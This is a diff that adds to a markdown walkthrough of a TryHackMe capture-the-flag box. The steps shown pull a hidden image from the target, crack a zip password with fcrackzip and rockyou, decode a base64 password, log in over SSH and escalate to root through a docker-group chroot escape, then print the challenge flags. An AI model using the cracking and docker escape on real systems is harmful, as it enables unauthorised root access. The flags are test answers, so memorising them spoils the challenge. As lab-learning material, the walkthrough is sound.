@@ -123,3 +123,99 @@ cat local.txt
 {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
 ```
 
+```
+python3 -m http.server 12345
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/bcc4fc11-8c5a-4790-9d81-2cc8ef9015ab)
+
+```
+wget -c http://10.10.51.43:12345/hacker-with-laptop_23-2147985341.jpg
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/41eebc01-30ba-4765-b4ac-b714b71eab50)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/83ed790e-7a7e-479e-8a9d-a49969ceffef)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a455bb58-5cbd-47a9-884d-b58b319e6099)
+
+```
+fcrackzip --use-unzip --dictionary --init-password /usr/share/wordlists/rockyou.txt backup.zip
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/cd948a36-ac63-41b7-b977-4b5b5efec040)
+
+```
+pass1word
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ed0231c1-c39f-4423-9bac-e1892344321b)
+
+```
+echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' |base64 -d
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c092e285-5ad5-4ebe-a150-98a4e815935a)
+
+```
+!d0ntKn0wmYp@ssw0rd
+```
+
+```
+ssh anurodh@10.10.51.43
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/560f0403-0f3e-4c88-bff0-225876cfc355)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/4bb0e7c5-9ad8-4985-9e39-5427b8552cfd)
+
+https://gtfobins.github.io/gtfobins/docker/
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+```
+grep -rnw '/root' -e 'USER-FLAG' 2>/dev/null
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/47e0987b-816f-4137-95f5-d081accff55d)
+
+```
+# cat /root/proof.txt
+
+
+                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+
+
+Congratulations! You have successfully completed the challenge.
+
+
+         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
+,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
+|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
+|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
+ \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
+ | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
+  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
+  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
+  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  
+
+
+--------------------------------------------Designed By -------------------------------------------------------
+                                        |  Anurodh Acharya |
+                                        ---------------------
+
+                                     Let me know if you liked it.
+
+Twitter
+        - @acharya_anurodh
+Linkedin
+        - www.linkedin.com/in/anurodh-acharya-b1937116a
+
+
+
+# 
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6acacacf-0aab-41d4-90b4-61141c98e2ce)
